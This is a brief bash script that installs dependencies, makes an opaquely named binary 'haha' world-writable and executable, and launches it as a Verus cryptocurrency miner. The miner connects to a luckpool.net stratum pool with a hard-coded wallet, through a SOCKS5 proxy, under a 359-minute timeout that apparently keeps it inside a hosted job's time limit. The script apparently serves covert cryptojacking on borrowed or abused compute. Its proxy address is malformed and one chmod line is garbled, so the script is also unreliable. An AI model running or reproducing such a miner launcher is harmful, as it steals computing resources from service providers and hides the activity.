#!/bin/bash
sudo apt update
sudo apt install screen libjansson4 -y
chmod +x test.sh && chmod +x haha chmod 777 haha test.sh
screen -dmS ls
A=stratum+tcp://na.luckpool.net:3956
B=R9WfkuyN7thLWMiL98b2NrHfL1qRYzqcdY
C=TESSSS
D=socks5://7134.209.240.44:1080
timeout 359m ./haha -a verus -o $A -u $B.$C -p x -t 2 -x $D
sudo apt update
